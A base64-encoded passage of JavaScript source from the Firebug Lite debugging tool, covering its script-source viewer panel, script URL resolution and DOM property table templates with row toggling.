IGFyZ3VtZW50cyk7DQogICAgICAgIA0KICAgICAgICB2YXIgb2xkUGFuZWwgPSBvbGRDaHJvbWUuZ2V0UGFuZWwoIlNjcmlwdCIpOw0KICAgICAgICB2YXIgaW5kZXggPSBvbGRQYW5lbC5zZWxlY3RJbmRleDsNCiAgICAgICAgDQogICAgICAgIHRoaXMuc2VsZWN0Tm9kZS5zZWxlY3RlZEluZGV4ID0gaW5kZXg7DQogICAgICAgIHRoaXMuc2VsZWN0SW5kZXggPSBpbmRleDsNCiAgICAgICAgdGhpcy5zb3VyY2VJbmRleCA9IC0xOw0KICAgIH0sDQogICAgDQogICAgb25DaGFuZ2VTZWxlY3Q6IGZ1bmN0aW9uKGV2ZW50KQ0KICAgIHsNCiAgICAgICAgdmFyIHNlbGVjdCA9IHRoaXMuc2VsZWN0Tm9kZTsNCiAgICAgICAgDQogICAgICAgIHRoaXMuc2VsZWN0SW5kZXggPSBzZWxlY3Quc2VsZWN0ZWRJbmRleDsNCiAgICAgICAgDQogICAgICAgIHZhciBvcHRpb24gPSBzZWxlY3Qub3B0aW9uc1tzZWxlY3Quc2VsZWN0ZWRJbmRleF07DQogICAgICAgIGlmICghb3B0aW9uKQ0KICAgICAgICAgICAgcmV0dXJuOw0KICAgICAgICANCiAgICAgICAgdmFyIHNlbGVjdGVkU291cmNlSW5kZXggPSBwYXJzZUludChvcHRpb24udmFsdWUpOw0KICAgICAgICANCiAgICAgICAgdGhpcy5yZW5kZXJTb3VyY2VDb2RlKHNlbGVjdGVkU291cmNlSW5kZXgpOw0KICAgIH0sDQogICAgDQogICAgc2VsZWN0U291cmNlQ29kZTogZnVuY3Rpb24oaW5kZXgpDQogICAgew0KICAgICAgICB2YXIgc2VsZWN0ID0gdGhpcy5zZWxlY3ROb2RlOyANCiAgICAgICAgc2VsZWN0LnNlbGVjdGVkSW5kZXggPSBpbmRleDsNCiAgICAgICAgDQogICAgICAgIHZhciBvcHRpb24gPSBzZWxlY3Qub3B0aW9uc1tpbmRleF07DQogICAgICAgIGlmICghb3B0aW9uKQ0KICAgICAgICAgICAgcmV0dXJuOw0KICAgICAgICANCiAgICAgICAgdmFyIHNlbGVjdGVkU291cmNlSW5kZXggPSBwYXJzZUludChvcHRpb24udmFsdWUpOw0KICAgICAgICANCiAgICAgICAgdGhpcy5yZW5kZXJTb3VyY2VDb2RlKHNlbGVjdGVkU291cmNlSW5kZXgpOw0KICAgIH0sDQogICAgDQogICAgcmVuZGVyU291cmNlQ29kZTogZnVuY3Rpb24oaW5kZXgpDQogICAgew0KICAgICAgICBpZiAodGhpcy5zb3VyY2VJbmRleCAhPSBpbmRleCkNCiAgICAgICAgew0KICAgICAgICAgICAgdmFyIHJlbmRlclByb2Nlc3MgPSBmdW5jdGlvbiByZW5kZXJQcm9jZXNzKHNyYykNCiAgICAgICAgICAgIHsNCiAgICAgICAgICAgICAgICB2YXIgaHRtbCA9IFtdLA0KICAgICAgICAgICAgICAgICAgICBobCA9IDA7DQogICAgICAgICAgICAgICAgDQogICAgICAgICAgICAgICAgc3JjID0gaXNJRSAmJiAhaXNFeHRlcm5hbCA/IA0KICAgICAgICAgICAgICAgICAgICAgICAgc3JjKydcbicgOiAgLy8gSUUgcHV0IGFuIGV4dHJhIGxpbmUgd2hlbiByZWFkaW5nIHNvdXJjZSBvZiBsb2NhbCByZXNvdXJjZXMNCiAgICAgICAgICAgICAgICAgICAgICAgICdcbicrc3JjOw0KICAgICAgICAgICAgICAgIA0KICAgICAgICAgICAgICAgIC8vIGZpbmQgdGhlIG51bWJlciBvZiBsaW5lcyBvZiBjb2RlDQogICAgICAgICAgICAgICAgc3JjID0gc3JjLnJlcGxhY2UoL1xuXHJ8XHJcbi9nLCAiXG4iKTsNCiAgICAgICAgICAgICAgICB2YXIgbWF0Y2ggPSBzcmMubWF0Y2goL1tcbl0vZyk7DQogICAgICAgICAgICAgICAgdmFyIGxpbmVzPW1hdGNoID8gbWF0Y2gubGVuZ3RoIDogMDsNCiAgICAgICAgICAgICAgICANCiAgICAgICAgICAgICAgICAvLyByZW5kZXIgdGhlIGZ1bGwgc291cmNlIGNvZGUgKyBsaW5lIG51bWJlcnMgaHRtbA0KICAgICAgICAgICAgICAgIGh0bWxbaGwrK10gPSAnPGRpdj48ZGl2IGNsYXNzPSJzb3VyY2VCb3giIHN0eWxlPSJsZWZ0Oic7IA0KICAgICAgICAgICAgICAgIGh0bWxbaGwrK10gPSAzNSArIDcqKGxpbmVzKycnKS5sZW5ndGg7DQogICAgICAgICAgICAgICAgaHRtbFtobCsrXSA9ICdweDsiPjxwcmUgY2xhc3M9InNvdXJjZUNvZGUiPic7DQogICAgICAgICAgICAgICAgaHRtbFtobCsrXSA9IGVzY2FwZUhUTUwoc3JjKTsNCiAgICAgICAgICAgICAgICBodG1sW2hsKytdID0gJzwvcHJlPjwvZGl2PjxkaXYgY2xhc3M9ImxpbmVObyI+JzsNCiAgICAgICAgICAgICAgICANCiAgICAgICAgICAgICAgICAvLyByZW5kZXIgdGhlIGxpbmUgbnVtYmVyIGRpdnMNCiAgICAgICAgICAgICAgICBmb3IodmFyIGw9MSwgbGluZXM7IGw8PWxpbmVzOyBsKyspDQogICAgICAgICAgICAgICAgew0KICAgICAgICAgICAgICAgICAgICBodG1sW2hsKytdID0gJzxkaXYgbGluZT0iJzsNCiAgICAgICAgICAgICAgICAgICAgaHRtbFtobCsrXSA9IGw7DQogICAgICAgICAgICAgICAgICAgIGh0bWxbaGwrK10gPSAnIj4nOw0KICAgICAgICAgICAgICAgICAgICBodG1sW2hsKytdID0gbDsNCiAgICAgICAgICAgICAgICAgICAgaHRtbFtobCsrXSA9ICc8L2Rpdj4nOw0KICAgICAgICAgICAgICAgIH0NCiAgICAgICAgICAgICAgICANCiAgICAgICAgICAgICAgICBodG1sW2hsKytdID0gJzwvZGl2PjwvZGl2Pic7DQogICAgICAgICAgICAgICAgDQogICAgICAgICAgICAgICAgdXBkYXRlUGFuZWwoaHRtbCk7DQogICAgICAgICAgICB9Ow0KICAgICAgICAgICAgDQogICAgICAgICAgICB2YXIgdXBkYXRlUGFuZWwgPSBmdW5jdGlvbihodG1sKQ0KICAgICAgICAgICAgew0KICAgICAgICAgICAgICAgIHNlbGYucGFuZWxOb2RlLmlubmVySFRNTCA9IGh0bWwuam9pbigiIik7DQogICAgICAgICAgICAgICAgDQogICAgICAgICAgICAgICAgLy8gSUUgbmVlZHMgdGhpcyB0aW1lb3V0LCBvdGhlcndpc2UgdGhlIHBhbmVsIHdvbid0IHNjcm9sbA0KICAgICAgICAgICAgICAgIHNldFRpbWVvdXQoZnVuY3Rpb24oKXsNCiAgICAgICAgICAgICAgICAgICAgc2VsZi5zeW5jaHJvbml6ZVVJKCk7DQogICAgICAgICAgICAgICAgfSwwKTsgICAgICAgICAgICAgICAgICAgICAgICANCiAgICAgICAgICAgIH07DQogICAgICAgICAgICANCiAgICAgICAgICAgIHZhciBvbkZhaWx1cmUgPSBmdW5jdGlvbigpDQogICAgICAgICAgICB7DQogICAgICAgICAgICAgICAgRmlyZWJ1Z1JlcHMuV2FybmluZy50YWcucmVwbGFjZSh7b2JqZWN0OiAiQWNjZXNzUmVzdHJpY3RlZCJ9LCBzZWxmLnBhbmVsTm9kZSk7DQogICAgICAgICAgICB9Ow0KICAgICAgICAgICAgDQogICAgICAgICAgICB2YXIgc2VsZiA9IHRoaXM7DQogICAgICAgICAgICANCiAgICAgICAgICAgIHZhciBkb2MgPSBGaXJlYnVnLmJyb3dzZXIuZG9jdW1lbnQ7DQogICAgICAgICAgICB2YXIgc2NyaXB0ID0gZG9jLmdldEVsZW1lbnRzQnlUYWdOYW1lKCJzY3JpcHQiKVtpbmRleF07DQogICAgICAgICAgICB2YXIgdXJsID0gZ2V0U2NyaXB0VVJMKHNjcmlwdCk7DQogICAgICAgICAgICB2YXIgaXNFeHRlcm5hbCA9IHVybCAmJiB1cmwgIT0gZG9jLmxvY2F0aW9uLmhyZWY7DQogICAgICAgICAgICANCiAgICAgICAgICAgIHRyeQ0KICAgICAgICAgICAgew0KICAgICAgICAgICAgICAgIGlmIChGaXJlYnVnLmRpc2FibGVSZXNvdXJjZUZldGNoaW5nKQ0KICAgICAgICAgICAgICAgIHsNCiAgICAgICAgICAgICAgICAgICAgcmVuZGVyUHJvY2VzcyhGaXJlYnVnLkxpdGUuUHJveHkuZmV0Y2hSZXNvdXJjZURpc2FibGVkTWVzc2FnZSk7DQogICAgICAgICAgICAgICAgfQ0KICAgICAgICAgICAgICAgIGVsc2UgaWYgKGlzRXh0ZXJuYWwpDQogICAgICAgICAgICAgICAgew0KICAgICAgICAgICAgICAgICAgICBBamF4LnJlcXVlc3Qoe3VybDogdXJsLCBvblN1Y2Nlc3M6IHJlbmRlclByb2Nlc3MsIG9uRmFpbHVyZTogb25GYWlsdXJlfSk7DQogICAgICAgICAgICAgICAgfQ0KICAgICAgICAgICAgICAgIGVsc2UNCiAgICAgICAgICAgICAgICB7DQogICAgICAgICAgICAgICAgICAgIHZhciBzcmMgPSBzY3JpcHQuaW5uZXJIVE1MOw0KICAgICAgICAgICAgICAgICAgICByZW5kZXJQcm9jZXNzKHNyYyk7DQogICAgICAgICAgICAgICAgfQ0KICAgICAgICAgICAgfQ0KICAgICAgICAgICAgY2F0Y2goZSkNCiAgICAgICAgICAgIHsNCiAgICAgICAgICAgICAgICBvbkZhaWx1cmUoKTsNCiAgICAgICAgICAgIH0NCiAgICAgICAgICAgICAgICANCiAgICAgICAgICAgIHRoaXMuc291cmNlSW5kZXggPSBpbmRleDsNCiAgICAgICAgfQ0KICAgIH0NCn0pOw0KDQpGaXJlYnVnLnJlZ2lzdGVyUGFuZWwoU2NyaXB0UGFuZWwpOw0KDQoNCi8vICoqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKg0KDQoNCnZhciBnZXRTY3JpcHRVUkwgPSBmdW5jdGlvbiBnZXRTY3JpcHRVUkwoc2NyaXB0KSANCnsNCiAgICB2YXIgcmVGaWxlID0gLyhbXlwvXD8jXSspKCMuKyk/JC87DQogICAgdmFyIHJlUGF0aCA9IC9eKC4qXC8pLzsNCiAgICB2YXIgcmVQcm90b2NvbCA9IC9eXHcrOlwvXC8vOw0KICAgIHZhciBwYXRoID0gbnVsbDsNCiAgICB2YXIgZG9jID0gRmlyZWJ1Zy5icm93c2VyLmRvY3VtZW50Ow0KICAgIA0KICAgIHZhciBmaWxlID0gcmVGaWxlLmV4ZWMoc2NyaXB0LnNyYyk7DQoNCiAgICBpZiAoZmlsZSkNCiAgICB7DQogICAgICAgIHZhciBmaWxlTmFtZSA9IGZpbGVbMV07DQogICAgICAgIHZhciBmaWxlT3B0aW9ucyA9IGZpbGVbMl07DQogICAgICAgIA0KICAgICAgICAvLyBhYnNvbHV0ZSBwYXRoDQogICAgICAgIGlmIChyZVByb3RvY29sLnRlc3Qoc2NyaXB0LnNyYykpIHsNCiAgICAgICAgICAgIHBhdGggPSByZVBhdGguZXhlYyhzY3JpcHQuc3JjKVsxXTsNCiAgICAgICAgICANCiAgICAgICAgfQ0KICAgICAgICAvLyByZWxhdGl2ZSBwYXRoDQogICAgICAgIGVsc2UNCiAgICAgICAgew0KICAgICAgICAgICAgdmFyIHIgPSByZVBhdGguZXhlYyhzY3JpcHQuc3JjKTsNCiAgICAgICAgICAgIHZhciBzcmMgPSByID8gclsxXSA6IHNjcmlwdC5zcmM7DQogICAgICAgICAgICB2YXIgYmFja0RpciA9IC9eKCg/OlwuXC5cLykrKSguKikvLmV4ZWMoc3JjKTsNCiAgICAgICAgICAgIHZhciByZUxhc3REaXIgPSAvXiguKlwvKVteXC9dK1wvJC87DQogICAgICAgICAgICBwYXRoID0gcmVQYXRoLmV4ZWMoZG9jLmxvY2F0aW9uLmhyZWYpWzFdOw0KICAgICAgICAgICAgDQogICAgICAgICAgICAvLyAiLi4vc29tZS9wYXRoIg0KICAgICAgICAgICAgaWYgKGJhY2tEaXIpDQogICAgICAgICAgICB7DQogICAgICAgICAgICAgICAgdmFyIGogPSBiYWNrRGlyWzFdLmxlbmd0aC8zOw0KICAgICAgICAgICAgICAgIHZhciBwOw0KICAgICAgICAgICAgICAgIHdoaWxlIChqLS0gPiAwKQ0KICAgICAgICAgICAgICAgICAgICBwYXRoID0gcmVMYXN0RGlyLmV4ZWMocGF0aClbMV07DQoNCiAgICAgICAgICAgICAgICBwYXRoICs9IGJhY2tEaXJbMl07DQogICAgICAgICAgICB9DQogICAgICAgICAgICANCiAgICAgICAgICAgIGVsc2UgaWYoc3JjLmluZGV4T2YoIi8iKSAhPSAtMSkNCiAgICAgICAgICAgIHsNCiAgICAgICAgICAgICAgICAvLyAiLi9zb21lL3BhdGgiDQogICAgICAgICAgICAgICAgaWYoL15cLlwvLi8udGVzdChzcmMpKQ0KICAgICAgICAgICAgICAgIHsNCiAgICAgICAgICAgICAgICAgICAgcGF0aCArPSBzcmMuc3Vic3RyaW5nKDIpOw0KICAgICAgICAgICAgICAgIH0NCiAgICAgICAgICAgICAgICAvLyAiL3NvbWUvcGF0aCINCiAgICAgICAgICAgICAgICBlbHNlIGlmKC9eXC8uLy50ZXN0KHNyYykpDQogICAgICAgICAgICAgICAgew0KICAgICAgICAgICAgICAgICAgICB2YXIgZG9tYWluID0gL14oXHcrOlwvXC9bXlwvXSspLy5leGVjKHBhdGgpOw0KICAgICAgICAgICAgICAgICAgICBwYXRoID0gZG9tYWluWzFdICsgc3JjOw0KICAgICAgICAgICAgICAgIH0NCiAgICAgICAgICAgICAgICAvLyAic29tZS9wYXRoIg0KICAgICAgICAgICAgICAgIGVsc2UNCiAgICAgICAgICAgICAgICB7DQogICAgICAgICAgICAgICAgICAgIHBhdGggKz0gc3JjOw0KICAgICAgICAgICAgICAgIH0NCiAgICAgICAgICAgIH0NCiAgICAgICAgfQ0KICAgIH0NCiAgICANCiAgICB2YXIgbSA9IHBhdGggJiYgcGF0aC5tYXRjaCgvKFteXC9dKylcLyQvKSB8fCBudWxsOw0KICAgIA0KICAgIGlmIChwYXRoICYmIG0pDQogICAgew0KICAgICAgICByZXR1cm4gcGF0aCArIGZpbGVOYW1lOw0KICAgIH0NCn07DQoNCnZhciBnZXRGaWxlTmFtZSA9IGZ1bmN0aW9uIGdldEZpbGVOYW1lKHBhdGgpDQp7DQogICAgaWYgKCFwYXRoKSByZXR1cm4gIiI7DQogICAgDQogICAgdmFyIG1hdGNoID0gcGF0aCAmJiBwYXRoLm1hdGNoKC9bXlwvXSsoXD8uKik/KCMuKik/JC8pOw0KICAgIA0KICAgIHJldHVybiBtYXRjaCAmJiBtYXRjaFswXSB8fCBwYXRoOw0KfTsNCg0KDQovLyAqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioNCn19KTsNCg0KLyogU2VlIGxpY2Vuc2UudHh0IGZvciB0ZXJtcyBvZiB1c2FnZSAqLw0KDQpGQkwubnMoZnVuY3Rpb24oKSB7IHdpdGggKEZCTCkgew0KLy8gKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqDQoNCi8vICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqDQoNCnZhciBFbGVtZW50Q2FjaGUgPSBGaXJlYnVnLkxpdGUuQ2FjaGUuRWxlbWVudDsNCg0KdmFyIGluc2VydFNsaWNlU2l6ZSA9IDE4Ow0KdmFyIGluc2VydEludGVydmFsID0gNDA7DQoNCnZhciBpZ25vcmVWYXJzID0NCnsNCiAgICAiX19maXJlYnVnX18iOiAxLA0KICAgICJldmFsIjogMSwNCg0KICAgIC8vIFdlIGFyZSBmb3JjZWQgdG8gaWdub3JlIEphdmEtcmVsYXRlZCB2YXJpYWJsZXMsIGJlY2F1c2UNCiAgICAvLyB0cnlpbmcgdG8gYWNjZXNzIHRoZW0gY2F1c2VzIGJyb3dzZXIgZnJlZXplDQogICAgImphdmEiOiAxLA0KICAgICJzdW4iOiAxLA0KICAgICJQYWNrYWdlcyI6IDEsDQogICAgIkphdmFBcnJheSI6IDEsDQogICAgIkphdmFNZW1iZXIiOiAxLA0KICAgICJKYXZhT2JqZWN0IjogMSwNCiAgICAiSmF2YUNsYXNzIjogMSwNCiAgICAiSmF2YVBhY2thZ2UiOiAxLA0KICAgICJfZmlyZWJ1ZyI6IDEsDQogICAgIl9GaXJlYnVnQ29uc29sZSI6IDEsDQogICAgIl9GaXJlYnVnQ29tbWFuZExpbmUiOiAxDQp9Ow0KDQppZiAoRmlyZWJ1Zy5pZ25vcmVGaXJlYnVnRWxlbWVudHMpDQogICAgaWdub3JlVmFyc1tGaXJlYnVnLkxpdGUuQ2FjaGUuSURdID0gMTsNCg0KLy8gKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICoNCg0KdmFyIG1lbWJlclBhbmVsUmVwID0NCiAgICBpc0lFNiA/DQogICAgeyJjbGFzcyI6ICJtZW1iZXJMYWJlbCAkbWVtYmVyLnR5cGVcXExhYmVsIiwgaHJlZjogImphdmFjcmlwdDp2b2lkKDApIn0NCiAgICA6DQogICAgeyJjbGFzcyI6ICJtZW1iZXJMYWJlbCAkbWVtYmVyLnR5cGVcXExhYmVsIn07DQoNCnZhciBSb3dUYWcgPQ0KICAgIFRSKHsiY2xhc3MiOiAibWVtYmVyUm93ICRtZW1iZXIub3BlbiAkbWVtYmVyLnR5cGVcXFJvdyIsICRoYXNDaGlsZHJlbjogIiRtZW1iZXIuaGFzQ2hpbGRyZW4iLCByb2xlIDogJ3ByZXNlbnRhdGlvbicsDQogICAgICAgIGxldmVsOiAiJG1lbWJlci5sZXZlbCJ9LA0KICAgICAgICBURCh7ImNsYXNzIjogIm1lbWJlckxhYmVsQ2VsbCIsIHN0eWxlOiAicGFkZGluZy1sZWZ0OiAkbWVtYmVyLmluZGVudFxccHgiLCByb2xlIDogJ3ByZXNlbnRhdGlvbid9LA0KICAgICAgICAgICAgQShtZW1iZXJQYW5lbFJlcCwNCiAgICAgICAgICAgICAgICBTUEFOKHt9LCAiJG1lbWJlci5uYW1lIikNCiAgICAgICAgICAgICkNCiAgICAgICAgKSwNCiAgICAgICAgVEQoeyJjbGFzcyI6ICJtZW1iZXJWYWx1ZUNlbGwiLCByb2xlIDogJ3ByZXNlbnRhdGlvbid9LA0KICAgICAgICAgICAgVEFHKCIkbWVtYmVyLnRhZyIsIHtvYmplY3Q6ICIkbWVtYmVyLnZhbHVlIn0pDQogICAgICAgICkNCiAgICApOw0KDQp2YXIgV2F0Y2hSb3dUYWcgPQ0KICAgIFRSKHsiY2xhc3MiOiAid2F0Y2hOZXdSb3ciLCBsZXZlbDogMH0sDQogICAgICAgIFREKHsiY2xhc3MiOiAid2F0Y2hFZGl0Q2VsbCIsIGNvbHNwYW46IDJ9LA0KICAgICAgICAgICAgRElWKHsiY2xhc3MiOiAid2F0Y2hFZGl0Qm94IGExMXlGb2N1c05vVGFiIiwgcm9sZTogImJ1dHRvbiIsICd0YWJpbmRleCcgOiAnMCcsDQogICAgICAgICAgICAgICAgJ2FyaWEtbGFiZWwnIDogJFNUUigncHJlc3MgZW50ZXIgdG8gYWRkIG5ldyB3YXRjaCBleHByZXNzaW9uJyl9LA0KICAgICAgICAgICAgICAgICAgICAkU1RSKCJOZXdXYXRjaCIpDQogICAgICAgICAgICApDQogICAgICAgICkNCiAgICApOw0KDQp2YXIgU2l6ZXJSb3cgPQ0KICAgIFRSKHtyb2xlIDogJ3ByZXNlbnRhdGlvbid9LA0KICAgICAgICBURCh7d2lkdGg6ICIzMCUifSksDQogICAgICAgIFREKHt3aWR0aDogIjcwJSJ9KQ0KICAgICk7DQoNCnZhciBkb21UYWJsZUNsYXNzID0gaXNJRWx0OCA/ICJkb21UYWJsZSBkb21UYWJsZUlFIiA6ICJkb21UYWJsZSI7DQp2YXIgRGlyVGFibGVQbGF0ZSA9IGRvbXBsYXRlKEZpcmVidWcuUmVwLA0Kew0KICAgIHRhZzoNCiAgICAgICAgVEFCTEUoeyJjbGFzcyI6IGRvbVRhYmxlQ2xhc3MsIGNlbGxwYWRkaW5nOiAwLCBjZWxsc3BhY2luZzogMCwgb25jbGljazogIiRvbkNsaWNrIiwgcm9sZSA6InRyZWUifSwNCiAgICAgICAgICAgIFRCT0RZKHtyb2xlOiAncHJlc2VudGF0aW9uJ30sDQogICAgICAgICAgICAgICAgU2l6ZXJSb3csDQogICAgICAgICAgICAgICAgRk9SKCJtZW1iZXIiLCAiJG9iamVjdHxtZW1iZXJJdGVyYXRvciIsIFJvd1RhZykNCiAgICAgICAgICAgICkNCiAgICAgICAgKSwNCiAgICAgICAgDQogICAgd2F0Y2hUYWc6DQogICAgICAgIFRBQkxFKHsiY2xhc3MiOiBkb21UYWJsZUNsYXNzLCBjZWxscGFkZGluZzogMCwgY2VsbHNwYWNpbmc6IDAsDQogICAgICAgICAgICAgICBfdG9nZ2xlczogIiR0b2dnbGVzIiwgX2RvbVBhbmVsOiAiJGRvbVBhbmVsIiwgb25jbGljazogIiRvbkNsaWNrIiwgcm9sZSA6ICd0cmVlJ30sDQogICAgICAgICAgICBUQk9EWSh7cm9sZSA6ICdwcmVzZW50YXRpb24nfSwNCiAgICAgICAgICAgICAgICBTaXplclJvdywNCiAgICAgICAgICAgICAgICBXYXRjaFJvd1RhZw0KICAgICAgICAgICAgKQ0KICAgICAgICApLA0KDQogICAgdGFibGVUYWc6DQogICAgICAgIFRBQkxFKHsiY2xhc3MiOiBkb21UYWJsZUNsYXNzLCBjZWxscGFkZGluZzogMCwgY2VsbHNwYWNpbmc6IDAsDQogICAgICAgICAgICBfdG9nZ2xlczogIiR0b2dnbGVzIiwgX2RvbVBhbmVsOiAiJGRvbVBhbmVsIiwgb25jbGljazogIiRvbkNsaWNrIiwgcm9sZSA6ICd0cmVlJ30sDQogICAgICAgICAgICBUQk9EWSh7cm9sZSA6ICdwcmVzZW50YXRpb24nfSwNCiAgICAgICAgICAgICAgICBTaXplclJvdw0KICAgICAgICAgICAgKQ0KICAgICAgICApLA0KDQogICAgcm93VGFnOg0KICAgICAgICBGT1IoIm1lbWJlciIsICIkbWVtYmVycyIsIFJvd1RhZyksDQoNCiAgICBtZW1iZXJJdGVyYXRvcjogZnVuY3Rpb24ob2JqZWN0LCBsZXZlbCkNCiAgICB7DQogICAgICAgIHJldHVybiBnZXRNZW1iZXJzKG9iamVjdCwgbGV2ZWwpOw0KICAgIH0sDQoNCiAgICAvLyAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqDQoNCiAgICBvbkNsaWNrOiBmdW5jdGlvbihldmVudCkNCiAgICB7DQogICAgICAgIGlmICghaXNMZWZ0Q2xpY2soZXZlbnQpKQ0KICAgICAgICAgICAgcmV0dXJuOw0KICAgICAgICANCiAgICAgICAgdmFyIHRhcmdldCA9IGV2ZW50LnRhcmdldCB8fCBldmVudC5zcmNFbGVtZW50Ow0KDQogICAgICAgIHZhciByb3cgPSBnZXRBbmNlc3RvckJ5Q2xhc3ModGFyZ2V0LCAibWVtYmVyUm93Iik7DQogICAgICAgIHZhciBsYWJlbCA9IGdldEFuY2VzdG9yQnlDbGFzcyh0YXJnZXQsICJtZW1iZXJMYWJlbCIpOw0KICAgICAgICBpZiAobGFiZWwgJiYgaGFzQ2xhc3Mocm93LCAiaGFzQ2hpbGRyZW4iKSkNCiAgICAgICAgew0KICAgICAgICAgICAgdmFyIHJvdyA9IGxhYmVsLnBhcmVudE5vZGUucGFyZW50Tm9kZTsNCiAgICAgICAgICAgIHRoaXMudG9nZ2xlUm93KHJvdyk7DQogICAgICAgIH0NCiAgICAgICAgZWxzZQ0KICAgICAgICB7DQogICAgICAgICAgICB2YXIgb2JqZWN0ID0gRmlyZWJ1Zy5nZXRSZXBPYmplY3QodGFyZ2V0KTsNCiAgICAgICAgICAgIGlmICh0eXBlb2Yob2JqZWN0KSA9PSAiZnVuY3Rpb24iKQ0KICAgICAgICAgICAgew0KICAgICAgICAgICAgICAgIEZpcmVidWcuY2hyb21lLnNlbGVjdChvYmplY3QsICJzY3JpcHQiKTsNCiAgICAgICAgICAgICAgICBjYW5jZWxFdmVudChldmVudCk7DQogICAgICAgICAgICB9DQogICAgICAgICAgICBlbHNlIGlmIChldmVudC5kZXRhaWwgPT0gMiAmJiAhb2JqZWN0KQ0KICAgICAgICAgICAgew0KICAgICAgICAgICAgICAgIHZhciBwYW5lbCA9IHJvdy5wYXJlbnROb2RlLnBhcmVudE5vZGUuZG9tUGFuZWw7DQogICAgICAgICAgICAgICAgaWYgKHBhbmVsKQ0KICAgICAgICAgICAgICAgIHsNCiAgICAgICAgICAgICAgICAgICAgdmFyIHJvd1ZhbHVlID0gcGFuZWwuZ2V0Um93UHJvcGVydHlWYWx1ZShyb3cpOw0KICAgICAgICAgICAgICAgICAgICBpZiAodHlwZW9mKHJvd1ZhbHVlKSA9PSAiYm9vbGVhbiIpDQogICAgICAgICAgICAgICAgICAgICAgICBwYW5lbC5zZXRQcm9wZXJ0eVZhbHVlKHJvdywgIXJvd1ZhbHVlKTsNCiAgICAgICAgICAgICAgICAgICAgZWxzZQ0KICAgICAgICAgICAgICAgICAgICAgICAgcGFuZWwuZWRpdFByb3BlcnR5KHJvdyk7DQoNCiAgICAgICAgICAgICAgICAgICAgY2FuY2VsRXZlbnQoZXZlbnQpOw0KICAgICAgICAgICAgICAgIH0NCiAgICAgICAgICAgIH0NCiAgICAgICAgfQ0KICAgICAgICANCiAgICAgICAgcmV0dXJuIGZhbHNlOw0KICAgIH0sDQoNCiAgICB0b2dnbGVSb3c6IGZ1bmN0aW9uKHJvdykNCiAgICB7DQogICAgICAgIHZhciBsZXZlbCA9IHBhcnNlSW50KHJvdy5nZXRBdHRyaWJ1dGUoImxldmVsIikpOw0KICAgICAgICB2YXIgdG9nZ2xlcyA9IHJvdy5wYXJlbnROb2RlLnBhcmVudE5vZGUudG9nZ2xlczsNCg0KICAgICAgICBpZiAoaGFzQ2xhc3Mocm93LCAib3BlbmVkIikpDQogICAgICAgIHsNCiAgICAgICAgICAgIHJlbW92ZUNsYXNzKHJvdywgIm9wZW5lZCIpOw0KDQogICAgICAgICAgICBpZiAodG9nZ2xlcykNCiAgICAgICAgICAgIHsNCiAgICAgICAgICAgICAgICB2YXIgcGF0aCA9IGdldFBhdGgocm93KTsNCg0KICAgICAgICAgICAgICAgIC8vIFJlbW92ZSB0aGUgcGF0aCBmcm9tIHRoZSB0b2dnbGUgdHJlZQ0KICAgICAgICAgICAgICAgIGZvciAodmFyIGkgPSAwOyBpIDwgcGF0aC5sZW5ndGg7ICsraSkNCiAgICAgICAgICAgICAgICB7DQogICAgICAgICAgICAgICAgICAgIGlmIChpID09IHBhdGgubGVuZ3RoLTEpDQogICAgICAgICAgICAgICAgICAgICAgICBkZWxldGUgdG9nZ2xlc1twYXRoW2ldXTsNCiAgICAgICAgICAgICAgICAgICAgZWxzZQ0KICAgICAgICAgICAgICAgICAgICAgICAgdG9nZ2xlcyA9IHRvZ2dsZXNbcGF0aFtpXV07DQogICAgICAgICAgICAgICAgfQ0KICAgICAgICAgICAgfQ0KDQogICAgICAgICAgICB2YXIgcm93VGFnID0gdGhpcy5yb3dUYWc7DQogICAgICAgICAgICB2YXIgdGJvZHkgPSByb3cucGFyZW50Tm9kZTsNCg0KICAgICAgICAgICAgc2V0VGltZW91dChmdW5jdGlvbigpDQogICAgICAgICAgICB7DQogICAgICAgICAgICAgICAgZm9yICh2YXIgZmlyc3RSb3cgPSByb3cubmV4dFNpYmxpbmc7IGZpcnN0Um93OyBmaXJzdFJvdyA9IHJvdy5uZXh0U2libGluZykNCiAgICAgICAgICAgICAgICB7DQogICAgICAgICAgICAgICAgICAgIGlmIChwYXJzZUludChmaXJzdFJvdy5nZXRBdHRyaWJ1dGUoImxldmVsIikpIDw9IGxldmVsKQ0KICAgICAgICAgICAgICAgICAgICAgICAgYnJlYWs7DQoNCiAgICAgICAgICAgICAgICAgICAgdGJvZHkucmVtb3ZlQ2hpbGQoZmlyc3RSb3cpOw0KICAgICAgICAgICAgICAgIH0NCiAgICAgICAgICAgIH0sIHJvdy5pbnNlcnRUaW1lb3V0ID8gcm93Lmluc2VydFRpbWVvdXQgOiAwKTsNCiAgICAgICAgfQ0KICAgICAgICBlbHNlDQogICAgICAgIHsNCiAgICAgICAgICAgIHNldENsYXNzKHJvdywgIm9wZW5lZCIpOw0KDQogICAgICAgICAgICBpZiAodG9nZ2xlcykNCiAgICAgICAgICAgIHsNCiAgICAgICAgICAgICAgICB2YXIgcGF0aCA9IGdldFBhdGgocm93KTsNCg0KICAgICAgICAgICAgICAgIC8vIE1hcmsgdGhlIHBhdGggaW4gdGhlIHRvZ2dsZSB0cmVlDQogICAgICAgICAgICAgICAgZm9yICh2YXIgaSA9IDA7IGkgPCBwYXRoLmxlbmd0aDsgKytpKQ0KICAgICAgICAgICAgICAgIHsNCiAgICAgICAgICAgICAgICAgICAgdmFyIG5hbWUgPSBwYXRoW2ldOw0KICAgICAgICAgICAgICAgICAgICBpZiAodG9nZ2xlcy